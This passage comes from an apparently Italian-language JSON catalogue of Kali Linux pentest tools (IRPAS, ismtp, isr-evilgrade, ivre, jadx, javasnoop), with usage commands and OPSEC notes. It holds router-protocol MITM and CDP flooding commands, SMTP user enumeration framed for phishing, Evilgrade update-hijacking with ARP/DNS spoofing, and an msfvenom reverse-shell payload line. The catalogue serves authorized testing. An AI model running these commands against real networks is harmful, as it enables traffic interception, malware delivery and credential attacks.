falsi per impersonare switch o router, o floodare la rete con annunci CDP che esauriscono le risorse dei device Cisco (CAM table exhaustion). Rivela anche informazioni sulla topologia di rete dai CDP legittimi catturati.</p><p><strong>HSRP Takeover (hsrp):</strong> Hot Standby Router Protocol fornisce ridondanza del gateway. IRPAS può iniettare HSRP hello con priorità più alta per diventare Active Router, intercettando tutto il traffico destinato al gateway. L'autenticazione HSRP (quando presente) usa password in chiaro facilmente sniffabili. Attacco devastante per MITM su scala enterprise.</p><p><strong>IGRP/EIGRP Route Injection (igrp):</strong> Interior Gateway Routing Protocol (legacy) e il suo successore EIGRP permettono route injection se non autenticati. IRPAS può annunciare route fasulle per redirigere traffico specifico attraverso l'attacker. Particolarmente utile per intercettare traffico verso subnet specifiche senza diventare default gateway.</p><p><strong>IRDP Redirect Attack (irdp):</strong> ICMP Router Discovery Protocol permette agli host di scoprire gateway sulla rete. IRPAS invia IRDP Router Advertisement con priorità alta per diventare default gateway di tutti gli host che supportano IRDP. Meno comune oggi ma ancora presente in alcuni ambienti legacy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === CDP ATTACKS ===\n# Sniff CDP per info sulla rete\ncdp -i eth0 -v\n\n# CDP flooding (DoS su switch Cisco)\ncdp -i eth0 -n 1000 -r\n\n# Impersona un device Cisco\ncdp -i eth0 -D \"Fake_Switch\" -P \"WS-C3750\" -S \"Cisco IOS\"\n\n# === HSRP TAKEOVER ===\n# Diventa Active Router (MITM)\n# -g: group number (sniffa prima per trovarlo)\n# -p: priority (>100 per vincere)\n# -v: virtual IP da impersonare\nhsrp -i eth0 -g 10 -p 255 -v 192.168.1.1\n\n# Con autenticazione (se sniffata)\nhsrp -i eth0 -g 10 -p 255 -v 192.168.1.1 -a \"cisco\"\n\n# === IRDP REDIRECT ===\n# Annuncia come router con massima preferenza\nirdp -i eth0 -S 192.168.1.100\n\n# Specifica preference level\nirdp -i eth0 -S 192.168.1.100 -p 0x7fffffff\n\n# === IGRP INJECTION ===\n# Annuncia route fasulle\nigrp -i eth0 -a -n 10.0.0.0/8 -g 192.168.1.100\n\n# === POST-EXPLOITATION ===\n# Dopo HSRP takeover, abilita IP forwarding\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# Intercetta traffico con tcpdump/Wireshark\ntcpdump -i eth0 -w capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Infrastructure Penetration Testing</strong>, IRPAS è essenziale per testare la sicurezza dei protocolli di routing. Molte reti enterprise usano HSRP/VRRP per ridondanza senza autenticazione. Un test HSRP takeover dimostra immediatamente l'impatto critico e la necessità di implementare MD5 authentication. CDP può rivelare topologia di rete dettagliata.</p><p>Per <strong>Red Team Network Pivoting</strong>, dopo aver compromesso una macchina sulla rete interna, HSRP takeover permette di intercettare tutto il traffico del segmento senza installare agent su ogni host. Ideale per credential harvesting passivo, session hijacking, e reconnaissance del traffico interno. Più stealth di ARP poisoning in alcuni aspetti.</p><p>Nel <strong>Network Segmentation Verification</strong>, IRPAS può testare se VLAN hopping o routing manipulation sono possibili. Verifica che i protocolli di routing siano autenticati e che le trust boundary siano rispettate. Identifica se CDP leak information cross-VLAN o se HSRP group sono condivisi impropriamente.</p><p>Per <strong>Legacy Network Assessment</strong>, molte infrastrutture datate usano ancora IGRP (deprecato) o IRDP. IRPAS può identificare e sfruttare questi protocolli per dimostrare la necessità di upgrade. Anche HSRP version 1 con autenticazione plaintext è ancora comune.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Immediate Network Impact:</strong> Attacchi HSRP e IRDP cambiano il routing per tutti gli host del segmento. L'impatto è immediato e visibile. Un HSRP takeover può causare brevi interruzioni durante la transizione. Se IP forwarding non è configurato correttamente, si causa blackhole di traffico.</p><p><strong>Heavy Logging:</strong> Switch e router Cisco loggano cambiamenti HSRP state, nuovi CDP neighbors, e IGRP route changes. SNMP traps vengono generati. Syslog centrale cattura tutto. Network Operations Center vedrà immediatamente anomalie in ambienti monitorati.</p><p><strong>Potential DoS:</strong> CDP flooding può crashare switch con CAM table limitate. HSRP flapping può causare instabilità. IGRP route injection può creare routing loop. Testare SEMPRE in ambienti controllati prima, e avere rollback plan.</p><p><strong>Modern Mitigations:</strong> Ambienti maturi implementano HSRP MD5 authentication, CDP disabled su porte user, BPDU guard, e EIGRP authentication. Verificare che questi controlli siano effettivamente presenti è lo scopo principale dell'assessment.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "ismtp",
    "name": "ismtp",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ismtp/",
    "desc": "Testa server SMTP per user enumeration tramite VRFY, EXPN e RCPT TO commands.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ISMTP</strong> è uno strumento specializzato per user enumeration su server SMTP, sfruttando comandi standard del protocollo che molti server non disabilitano correttamente. Utilizza tre tecniche principali: VRFY (verify - chiede al server se un utente esiste), EXPN (expand - espande mailing list mostrando i membri), e RCPT TO (recipient - verifica se il server accetta email per un indirizzo). Anche quando VRFY e EXPN sono disabilitati, RCPT TO spesso rivela informazioni basandosi sui codici di risposta differenti tra utenti esistenti e non esistenti. Questo tipo di enumeration è fondamentale nella fase di reconnaissance per costruire liste di target validi per phishing, password spraying, o attacchi mirati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>VRFY Enumeration:</strong> Invia comandi VRFY username@domain e analizza le risposte. Un 250 o 251 indica utente esistente, 550 indica utente sconosciuto. Molti server legacy hanno VRFY abilitato di default. Anche risposte ambigue possono rivelare informazioni tramite timing analysis o differenze sottili nei messaggi di errore.</p><p><strong>EXPN Mailing List Expansion:</strong> Tenta di espandere mailing list e alias. EXPN group@domain può rivelare tutti i membri di una lista di distribuzione, esponendo utenti che non sarebbero altrimenti enumerabili. Particolarmente utile per scoprire alias come 'all-staff', 'developers', 'executives'.</p><p><strong>RCPT TO Enumeration:</strong> La tecnica più affidabile quando VRFY/EXPN sono disabilitati. Simula l'invio di una email con RCPT TO:user@domain e analizza i codici di risposta. Server che accettano per utenti validi ma rifiutano per invalidi permettono enumeration completa. Funziona anche con server che implementano catch-all se i timing differiscono.</p><p><strong>Batch Processing con Wordlist:</strong> Supporta file con liste di username da testare in batch. Combina con wordlist di nomi comuni, pattern aziendali (nome.cognome, iniziale.cognome), e username recuperati da OSINT. Output strutturato per facile parsing e integrazione con altri tool.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === TEST SINGOLI ===\n# Verifica singolo indirizzo\nismtp -h mail.target.com -e admin@target.com\n\n# Solo username (aggiunge dominio automaticamente)\nismtp -h mail.target.com -e admin -d target.com\n\n# === ENUMERATION CON WORDLIST ===\n# Wordlist di username comuni\nismtp -h mail.target.com -l /usr/share/wordlists/users.txt -d target.com\n\n# Metodo RCPT TO (più affidabile)\nismtp -h mail.target.com -l users.txt -d target.com -m RCPT\n\n# Metodo VRFY \nismtp -h mail.target.com -l users.txt -d target.com -m VRFY\n\n# Prova tutti i metodi\nismtp -h mail.target.com -l users.txt -d target.com -m ALL\n\n# === OPZIONI AVANZATE ===\n# Porta non standard\nismtp -h mail.target.com -p 587 -l users.txt -d target.com\n\n# Con STARTTLS\nismtp -h mail.target.com -l users.txt -d target.com --tls\n\n# Output verboso per debug\nismtp -h mail.target.com -l users.txt -d target.com -v\n\n# Rate limiting (delay tra test)\nismtp -h mail.target.com -l users.txt -d target.com --delay 1\n\n# === WORDLIST GENERATION ===\n# Genera wordlist da nomi\nfor name in $(cat names.txt); do\n  echo \"$name\"\n  echo \"${name}@target.com\"\n  echo \"$(echo $name | cut -c1).$(echo $name | cut -d' ' -f2)\"\ndone > userlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pre-Phishing Reconnaissance</strong>, prima di lanciare una campagna di phishing è essenziale verificare quali indirizzi sono validi. Inviare a indirizzi inesistenti genera bounce che possono triggerare alert. ISMTP permette di validare la lista di target, aumentando il success rate e riducendo il rumore.</p><p>Nel <strong>Password Spraying Preparation</strong>, per attacchi password spray (una password, molti utenti) serve una lista accurata di utenti validi. ISMTP enumera utenti SMTP che spesso corrispondono agli utenti di Active Directory. Combina con tool come Ruler o MailSniper per OWA/Exchange password spraying.</p><p>Durante <strong>Email Security Assessment</strong>, verifica se il server SMTP espone informazioni sugli utenti. Un server ben configurato dovrebbe rispondere allo stesso modo per utenti validi e invalidi (non enumerabile). ISMTP aiuta a identificare e documentare questa misconfiguration comune.</p><p>Per <strong>Social Engineering Intelligence</strong>, gli indirizzi email rivelano convenzioni di naming (nome.cognome, iniziale+cognome, etc.). Una volta identificato il pattern, è possibile generare email probabili per altri dipendenti trovati tramite LinkedIn o altre fonti OSINT senza ulteriore enumeration.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Connection Logging:</strong> Ogni connessione SMTP è loggata con IP sorgente. Server enterprise inviano log a SIEM dove pattern di enumeration (molte connessioni, errori sistematici) sono facilmente rilevabili. Usare IP differenti o timing lento per ridurre visibilità.</p><p><strong>Rate Limiting e Blocchi:</strong> Server moderni implementano rate limiting su connessioni e errori. Troppi tentativi falliti possono risultare in blocco temporaneo o permanente dell'IP. Alcuni server hanno greylist che ritardano le risposte a nuovi IP.</p><p><strong>Response Normalization:</strong> Server ben configurati (postfix reject_unverified_recipient, Exchange address book policies) rispondono identicamente per tutti gli indirizzi. In questi casi, enumeration basata su codici di risposta non funziona. Potrebbe essere necessario timing analysis.</p><p><strong>Legal Implications:</strong> SMTP enumeration può essere considerata reconnaissance non autorizzata. Assicurarsi di avere autorizzazione scritta che copre specificamente testing del mail server. Documentare scope e metodi approvati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMTP"
    ],
    "notes": null
  },
  {
    "id": "isr-evilgrade",
    "name": "isr-evilgrade",
    "version": "2.0.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/isr-evilgrade/",
    "desc": "Framework per attacchi su software update: inietta malware in aggiornamenti legittimi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Evilgrade è un framework modulare per exploitare meccanismi di software update insicuri, permettendo l'iniezione di payload malevoli al posto di aggiornamenti legittimi. Il principio sfrutta il fatto che molte applicazioni (specialmente legacy) verificano gli update via HTTP senza signature checking o con verifica debole, permettendo a un attacker in posizione MITM di sostituire il binario legittimo con malware. Evilgrade include moduli pre-configurati per oltre 60 applicazioni popolari tra cui Java, Notepad++, WinRAR, VMware, iTunes, e molti altri. Quando l'applicazione target cerca aggiornamenti, Evilgrade intercetta la richiesta e serve un payload malevolo che l'utente installa credendo sia un update legittimo. Sebbene l'efficacia sia diminuita con l'adozione di HTTPS e code signing, molte applicazioni legacy e ambienti enterprise rimangono vulnerabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Modular Architecture:</strong> Ogni applicazione target ha un modulo dedicato che definisce: URL di update check, pattern di risposta attesi, come servire il payload, e eventuali header o protocolli specifici. Creare nuovi moduli è relativamente semplice analizzando il meccanismo di update dell'applicazione target con un proxy.</p><p><strong>Integrated Web Server:</strong> Evilgrade include un webserver che risponde alle richieste di update, servendo i payload configurati. Gestisce automaticamente i redirect necessari, mime types corretti, e simula le risposte del server di update originale per ingannare l'applicazione.</p><p><strong>Multiple Payload Support:</strong> Supporta qualsiasi tipo di payload: exe, msi, dmg, o custom binaries. I payload vengono serviti con i nomi e le estensioni attese dall'applicazione. Funziona con payload Metasploit, Cobalt Strike, o qualsiasi executable custom.</p><p><strong>DNS/ARP Spoofing Integration:</strong> Progettato per funzionare insieme a tool MITM come ettercap, bettercap, o dnsspoof. Quando il traffico viene rediretto verso Evilgrade (tramite DNS spoofing del dominio di update o ARP poisoning), il framework gestisce automaticamente le richieste di update.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP EVILGRADE ===\n# Avvia la console interattiva\nevilgrade\n\n# Lista tutti i moduli disponibili\nevilgrade> show modules\n\n# Cerca moduli per keyword\nevilgrade> search java\nevilgrade> search notepad\n\n# === CONFIGURA MODULO ===\n# Seleziona un modulo\nevilgrade> configure notepadplus\n\n# Visualizza opzioni del modulo\nevilgrade(notepadplus)> show options\n\n# Imposta il payload malevolo\nevilgrade(notepadplus)> set agent /path/to/payload.exe\n\n# Avvia il server per questo modulo\nevilgrade(notepadplus)> start\n\n# === SETUP MITM (in altro terminale) ===\n# Opzione 1: DNS Spoofing\n# Trova i domini di update dal modulo\nevilgrade(notepadplus)> show vhosts\n# notepad-plus-plus.org\n\n# Spoof DNS con dnsspoof o bettercap\necho \"192.168.1.100 notepad-plus-plus.org\" >> /tmp/hosts\ndnsspoof -i eth0 -f /tmp/hosts\n\n# Opzione 2: ARP Poisoning con ettercap\nettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.50//\n\n# Opzione 3: Bettercap all-in-one\nbettercap -iface eth0 -eval \"set dns.spoof.domains notepad-plus-plus.org; dns.spoof on; arp.spoof on\"\n\n# === MULTI-TARGET ===\n# Configura più moduli simultaneamente\nevilgrade> configure java\nevilgrade(java)> set agent /path/to/java_payload.exe\nevilgrade(java)> start\n\nevilgrade> configure winrar\nevilgrade(winrar)> set agent /path/to/winrar_payload.exe\nevilgrade(winrar)> start\n\n# === GENERAZIONE PAYLOAD ===\n# Con msfvenom\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team Client-Side Attacks</strong>, quando si ha accesso alla rete interna, Evilgrade permette di compromettere workstation senza interazione diretta con gli utenti. Basta aspettare che un'applicazione vulnerabile controlli gli update. Particolarmente efficace in ambienti con molte applicazioni legacy. L'utente vede un prompt di update normale e clicca Install.</p><p>Durante <strong>Security Awareness Training</strong>, Evilgrade è perfetto per dimostrare perché gli update devono essere verificati con signature. Un demo live di update hijacking è molto più impattante di slide teoriche. Mostra concretamente il rischio di software che non usa HTTPS o code signing.</p><p>Nel <strong>Penetration Testing di Software Inventory</strong>, Evilgrade aiuta a identificare quali applicazioni nell'ambiente hanno meccanismi di update insicuri. Anche solo documentare quali software sono vulnerabili (senza eseguire payload) fornisce valore all'assessment.</p><p>Per <strong>Targeted Attacks su Applicazioni Specifiche</strong>, se la reconnaissance mostra che il target usa una specifica versione di software vulnerabile, Evilgrade permette attacchi mirati. Combina con phishing che suggerisce all'utente di controllare gli update per aumentare le probabilità di trigger.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>MITM Requirement:</strong> Evilgrade richiede controllo del traffico di rete. Questo significa ARP poisoning, DNS spoofing, o rogue access point. Tutti metodi che hanno proprie detection surface e possono generare alert di rete.</p><p><strong>Declining Effectiveness:</strong> Molte applicazioni moderne usano HTTPS pinning, code signing, e update framework sicuri (Windows Update, macOS Gatekeeper). Evilgrade è più efficace su software legacy, applicazioni free/open source, e ambienti enterprise con software datato.</p><p><strong>AV/EDR Evasion:</strong> Il payload deve evadere antivirus. Il fatto che venga eseguito come 'update' non bypassa scanning. Genera processo figlio dal processo dell'applicazione che sta 'aggiornandosi', il che può essere un pattern rilevabile.</p><p><strong>Certificate Warnings:</strong> Se l'applicazione usa HTTPS, il MITM richiede certificato falso che può generare warning. Alcune applicazioni hanno hard-coded trust e non accettano certificati self-signed. Testare prima con il modulo specifico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "ivre",
    "name": "ivre",
    "version": "0.9.21",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ivre/",
    "desc": "Framework per raccolta e analisi di dati di network recon con web interface e API.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>IVRE</strong> (Instrument de Veille sur les Réseaux Extérieurs) è un framework enterprise-grade per la raccolta, archiviazione, e analisi di dati di network reconnaissance su larga scala. Progettato originariamente per operazioni di intelligence su internet, IVRE può gestire miliardi di record provenienti da Nmap, Masscan, ZGrab, e altri scanner. Il sistema usa MongoDB per lo storage e offre una web interface interattiva per visualizzazione, query complesse, e analisi statistica. Include anche un potente sistema CLI per scripting e automazione. IVRE trasforma dati di scansione grezzi in intelligence actionable, permettendo di correlare servizi, identificare pattern, tracciare cambiamenti nel tempo, e generare report dettagliati. È lo strumento ideale per chi deve gestire reconnaissance di interi range IP, ASN, o internet-wide scan.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Data Ingestion:</strong> Importa dati da tutti i principali scanner: Nmap (XML), Masscan (JSON/XML), ZMap/ZGrab (JSON), Shodan, Censys export, e formati custom. Normalizza i dati in un formato comune mantenendo tutti i dettagli originali. Supporta import incrementale per scan ricorrenti con deduplicazione intelligente.</p><p><strong>Advanced Web Interface:</strong> La GUI web permette ricerche complesse con query language potente: cerca per IP range, servizio, porta, banner, CPE, paese, ASN, e combinazioni arbitrarie. Visualizza risultati su mappa geografica, genera grafici di distribuzione, e permette drill-down interattivo. Screenshot di servizi web catturati sono visualizzabili inline.</p><p><strong>Powerful Query Language:</strong> Il query language supporta operatori complessi: regex su banner, CIDR matching, port range, confronti temporali, e operatori booleani. Permette query come 'tutti gli host con SSH versione < 7.0 nel range 10.0.0.0/8 che hanno anche porta 3389 aperta' in una singola espressione.</p><p><strong>Flow Analysis (Passive DNS/NetFlow):</strong> Oltre agli scan attivi, IVRE può importare e analizzare dati passivi: passive DNS records, NetFlow/sFlow, e IPFIX. Questo permette di correlare dati di scansione con traffico reale osservato, identificando relazioni tra host e domini.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP INIZIALE ===\n# Inizializza database MongoDB\nivre ipinfo --init\nivre scancli --init\nivre passiverecon --init\n\n# === IMPORT SCAN ===\n# Import scan Nmap\nivre scan2db -s myscan nmap_output.xml\n\n# Import scan Masscan\nivre scan2db -s masscan_scan masscan_output.json\n\n# Import multipli file\nivre scan2db -s recon scans/*.xml\n\n# Import con categoria/tag\nivre scan2db -s corp_network --category internal scans/*.xml\n\n# === WEB INTERFACE ===\n# Avvia web server\nivre httpd --bind 0.0.0.0 --port 8080\n# Accedi via browser: http://localhost:8080\n\n# === CLI QUERIES ===\n# Trova host per IP\nivre scancli --host 192.168.1.1\n\n# Cerca per range CIDR\nivre scancli --net 10.0.0.0/8\n\n# Cerca servizi specifici\nivre scancli --service http\nivre scancli --service ssh --port 22\n\n# Banner matching con regex\nivre scancli --script http-title --grep \"login\"\n\n# Versioni specifiche\nivre scancli --service openssh --version \"7.2\"\n\n# Combinazioni complesse\nivre scancli --net 192.168.0.0/16 --openport 445 --openport 3389\n\n# === EXPORT ===\n# Export JSON\nivre scancli --net 10.0.0.0/8 --json > network_scan.json\n\n# Export CSV\nivre scancli --service ssh --csv > ssh_hosts.csv\n\n# === STATISTICHE ===\n# Top porte\nivre scancli --top port\n\n# Top servizi\nivre scancli --top service\n\n# Top prodotti\nivre scancli --top product\n\n# === PASSIVE DNS ===\n# Import passive DNS\nivre passiverecon2db pdns_data.json\n\n# Query passive recon\nivre passiverecon --domain example.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Enterprise Attack Surface Management</strong>, IVRE permette di mantenere un inventario continuo di tutti gli asset esposti. Import regolari da scan programmati (Masscan per discovery, Nmap per service detection) creano un database storico che traccia cambiamenti: nuovi host, nuovi servizi, versioni cambiate. Alert su variazioni critiche come nuove porte esposte.</p><p>Nelle <strong>Red Team Operations</strong>, dopo la fase di scanning esterno, IVRE centralizza tutti i dati di recon. La web interface permette di esplorare interattivamente i risultati, identificare target promettenti (versioni vulnerabili, servizi interessanti), e pianificare gli attacchi. Query salvate possono essere riutilizzate su nuovi scan.</p><p>Per <strong>Threat Intelligence e Research</strong>, IVRE può processare internet-wide scan (Shodan, Censys download) per analisi su larga scala. Identifica distribuzione geografica di servizi, traccia adoption di nuove versioni, monitora cambiamenti nel tempo. Utile per research su vulnerabilità o trend di deployment.</p><p>Nel <strong>Bug Bounty Reconnaissance</strong>, importa scan di tutti i target in scope in un database unificato. Cerca pattern vulnerabili (outdated versions, interesting tech stack) attraverso tutti i programmi simultaneamente. Traccia quali target hai già testato e quali hanno cambiato configurazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>IVRE is Passive:</strong> IVRE stesso non esegue scan, analizza solo dati. Non genera traffico di rete verso i target. Tuttavia, i dati che analizza provengono da scan attivi che hanno proprie implicazioni OPSEC.</p><p><strong>Database Security:</strong> Il database IVRE contiene informazioni sensibili su infrastrutture. Proteggere l'accesso: binding su localhost, authentication MongoDB, cifratura at rest. Non esporre la web interface su internet senza autenticazione.</p><p><strong>Data Retention:</strong> Conservare dati di scan su terze parti potrebbe avere implicazioni legali. Definire policy di retention appropriate. I dati storici sono utili ma aumentano anche il rischio in caso di breach del sistema IVRE.</p><p><strong>Resource Requirements:</strong> Per dataset grandi (milioni di host), IVRE richiede risorse significative: RAM per MongoDB, storage per database e screenshot, CPU per query complesse. Pianificare capacità appropriata per il volume di dati atteso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "jadx",
    "name": "jadx",
    "version": "1.5.2",
    "icon": "../app/icons/jadx-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jadx/",
    "desc": "Decompiler Android che converte DEX/APK in codice Java leggibile con GUI integrata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JADX</strong> è il decompiler Android più avanzato e user-friendly disponibile, capace di convertire file APK e DEX in codice Java sorgente altamente leggibile. A differenza di altri decompiler che producono output difficile da comprendere, JADX genera codice pulito con nomi di variabili recuperati (quando possibile), commenti sui bytecode originali, e struttura del codice fedele all'originale. Include una GUI potente con navigazione del codice, ricerca globale, cross-reference, e visualizzazione delle risorse (layout XML, strings, assets). Per la command line, supporta export in formato Gradle project completo, permettendo di aprire il codice decompilato direttamente in Android Studio per ulteriore analisi. JADX è lo strumento fondamentale per reverse engineering Android, security assessment di applicazioni mobile, analisi malware, e bug bounty su target mobile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Advanced Decompilation Engine:</strong> Converte Dalvik bytecode in Java source con alta fedeltà. Gestisce correttamente costrutti complessi: inner classes, lambda expressions, try-with-resources, switch su stringhe. Ricostruisce enum, annotation, e generics. Output significativamente più leggibile rispetto a tool legacy come dex2jar+JD-GUI.</p><p><strong>Integrated Deobfuscation:</strong> Quando il codice è offuscato (ProGuard, R8, DexGuard), JADX può rinominare classi, metodi e variabili con nomi più leggibili basandosi su heuristics. Mantiene mapping tra nomi originali e rinominati. Permette anche import di ProGuard mapping file per reverse della obfuscation se disponibile.</p><p><strong>Resource Analysis:</strong> Decompila completamente le risorse Android: layout XML con ID risolti, strings.xml in tutte le lingue, AndroidManifest con permessi e componenti, assets e raw files. Permette di correlare codice con UI e identificare entry points (activities, receivers, services).</p><p><strong>GUI Navigation e Search:</strong> La GUI supporta: click su classi/metodi per navigazione, find usages (chi chiama questo metodo), global search con regex, filtri per tipo, bookmarks, e export selettivo. Tabs multiple per confrontare codice. Syntax highlighting e code folding per leggibilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === GUI MODE ===\n# Avvia interfaccia grafica\njadx-gui\n# File -> Open -> seleziona APK o DEX\n\n# Apri direttamente un file\njadx-gui app.apk\n\n# === CLI DECOMPILATION ===\n# Decompila APK in directory\njadx -d output_directory app.apk\n\n# Decompila con deobfuscation\njadx --deobf -d output app.apk\n\n# Deobfuscation aggressiva\njadx --deobf --deobf-min 2 --deobf-use-hierarchic -d output app.apk\n\n# Export come progetto Gradle (apribile in Android Studio)\njadx -e -d android_project app.apk\n\n# === OPZIONI AVANZATE ===\n# Aumenta threads per APK grandi\njadx -j 8 -d output app.apk\n\n# Mostra più dettagli (comments con bytecode)\njadx --show-bad-code -d output app.apk\n\n# Skip risorse (solo codice)\njadx --no-res -d output app.apk\n\n# Forza sovrascrittura\njadx --overwrite -d output app.apk\n\n# === ANALISI SPECIFICA ===\n# Cerca API keys hardcoded\ngrep -r \"api_key\\|apikey\\|api-key\\|secret\" output/sources/\n\n# Cerca URL endpoints\ngrep -rE \"https?://[^\\\"']+\" output/sources/\n\n# Cerca Firebase config\ngrep -r \"firebase\\|firebaseio.com\" output/\n\n# Trova WebViews (potenziali XSS)\ngrep -r \"addJavascriptInterface\\|setJavaScriptEnabled\" output/\n\n# Cerca SQL queries (potenziale injection)\ngrep -r \"rawQuery\\|execSQL\" output/sources/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Mobile Application Security Assessment</strong>, JADX è il primo passo per analizzare un'app Android. Esamina l'implementazione di autenticazione, storage di credenziali, comunicazioni di rete, e gestione di dati sensibili. Identifica vulnerabilità come hardcoded secrets, insecure data storage, improper certificate validation, e SQL injection in ContentProviders.</p><p>Per <strong>Android Malware Analysis</strong>, JADX permette di capire cosa fa un'app malevola: quali permessi usa realmente, come comunica con C2, come ottiene persistenza, come esfiltra dati. La GUI rende facile seguire il flusso di esecuzione dall'entry point ai payload. Combina con emulatori o Frida per analisi dinamica.</p><p>Durante <strong>Bug Bounty su Target Mobile</strong>, molti programmi includono app Android in scope. JADX rivela API endpoints non documentati, business logic flaws, authentication bypass, e information disclosure. Le API keys e secrets hardcoded sono finding comuni. Esporta in Gradle per test con Android Studio.</p><p>Per <strong>Competitive Analysis e Research</strong>, capire come competitor implementano features specifiche. JADX permette di studiare algoritmi, protocolli proprietari, e implementazioni di sicurezza. Utile anche per ricercatori che studiano tracking, ads SDK, e privacy practices delle app.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Completely Offline:</strong> JADX opera completamente in locale. Non invia dati a server esterni, non richiede connessione internet. L'analisi non lascia tracce rilevabili dal publisher dell'app. Ideale per analisi che devono rimanere confidenziali.</p><p><strong>Anti-Decompilation Measures:</strong> Alcune app usano packer (DexProtector, Qihoo 360) che criptano il DEX. JADX non può decompilare codice criptato senza prima unpacking. Altri usano native code (JNI/NDK) che richiede analisi separata con IDA/Ghidra. Reflection e dynamic loading possono nascondere funzionalità.</p><p><strong>Obfuscation Challenges:</strong> Obfuscation aggressiva (DexGuard commercial) può rendere il codice molto difficile da capire anche dopo deobfuscation. Nomi come 'a.a.a.a()' richiedono analisi manuale per comprendere il significato. String encryption richiede analisi dinamica o emulazione per rivelare i valori.</p><p><strong>Legal Considerations:</strong> In molte giurisdizioni, reverse engineering per security research è legale. Tuttavia, redistribuire codice decompilato, aggirare DRM, o violare EULA può avere conseguenze legali. Documentare lo scopo dell'analisi e rispettare responsible disclosure.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "javasnoop",
    "name": "javasnoop",
    "version": "1.1",
    "icon": "../app/icons/javasnoop-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/javasnoop/",
    "desc": "Intercetta e modifica chiamate a metodi Java a runtime per analisi applicazioni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JavaSnoop</strong> è uno strumento di dynamic analysis per applicazioni Java che permette di intercettare, monitorare e modificare chiamate a metodi a runtime. Funziona agganciandosi (attach) a processi Java in esecuzione tramite Java Agent API, permettendo di inserire hook su qualsiasi metodo di qualsiasi classe caricata nella JVM. Una volta agganciato, JavaSnoop può: loggare ogni invocazione di metodi specifici con parametri e return value, modificare i parametri prima che il metodo venga eseguito, alterare i valori di ritorno prima che arrivino al chiamante, e persino bypassare completamente l'esecuzione di metodi. La GUI intuitiva permette di navigare le classi caricate, selezionare metodi da monitorare, e definire regole di tampering senza scrivere codice. È particolarmente utile per security testing di applicazioni Java thick-client e per comprendere la logica di applicazioni closed-source.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Runtime Method Hooking:</strong> Inserisce hook su qualsiasi metodo Java a runtime senza modificare il bytecode su disco. Supporta hooking di metodi di classi applicative, librerie, e persino classi del JDK. Gli hook possono essere aggiunti e rimossi dinamicamente mentre l'applicazione è in esecuzione.</p><p><strong>Parameter Tampering:</strong> Intercetta e modifica i parametri passati ai metodi prima dell'esecuzione. Permette di bypassare validazioni client-side modificando valori di input. Supporta tampering di primitive, oggetti, e strutture dati complesse con editor integrato.</p><p><strong>Return Value Modification:</strong> Modifica i valori ritornati dai metodi prima che arrivino al codice chiamante. Cruciale per bypassare controlli di autorizzazione (forza ritorno 'true' da isAuthorized()), licensing (checkLicense() sempre valido), o qualsiasi logica di validazione.</p><p><strong>Execution Control:</strong> Permette di bloccare completamente l'esecuzione di metodi selezionati o sostituire l'implementazione con custom code. Utile per neutralizzare funzioni di security o anti-tampering nell'applicazione target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO ===\n# Avvia JavaSnoop (richiede Java)\njavasnoop\n\n# === WORKFLOW GUI ===\n# 1. ATTACH A PROCESSO\n# - File -> New Session -> Attach to existing JVM\n# - Seleziona il processo 